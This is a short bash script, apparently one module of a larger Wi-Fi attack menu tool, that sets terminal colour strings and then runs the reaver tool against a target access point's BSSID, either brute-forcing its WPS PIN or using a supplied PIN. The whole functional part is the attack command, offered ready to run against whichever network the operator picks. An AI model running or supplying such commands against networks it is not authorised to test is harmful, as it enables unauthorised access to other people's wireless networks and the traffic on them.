#! /bin/bash
#############DEFAULTS###############
#setting yellow-start 
YS="\e[1;33m"
#setting color-end
CE="\e[0m"
#setting red-start
RS="\e[1;31m"
#setting frequent stings
YNYES="("$YS"y"$CE"/"$YS"n"$CE")("$YS"Enter"$CE"=yes)"
YNNO="("$YS"y"$CE"/"$YS"n"$CE")("$YS"Enter"$CE"=no)"
YNONLY="("$YS"y"$CE"/"$YS"n"$CE")"
PAKT="Press "$YS"any key$CE to"
PAKTC="Press "$YS"any key$CE to continue..."
PAKTGB="Press "$YS"any key$CE to go back..."

####################################
printf '\033]2;REAVER\a' &&
WLANNM=$(cat /root/lscript/wlanmon.txt)
export WLANNM
if [[ "$GLV" = "2" ]]
then
	echo -e "Please note that you need a very good signal for this to work."
	sleep 3
	echo -e "Starting..."
	sleep 1
	clear
	reaver -i $WLANNM -b $BSSIDT -d $DELT -S -N -c $CHANT -vv 
	echo -e "$PAKTC" 
	read
elif [[ "$GLV" = "3" ]]
then
	reaver -i $WLANNM -b $BSSIDT -p $WPST -vv
	echo -e "$PAKTC"
	read

fi
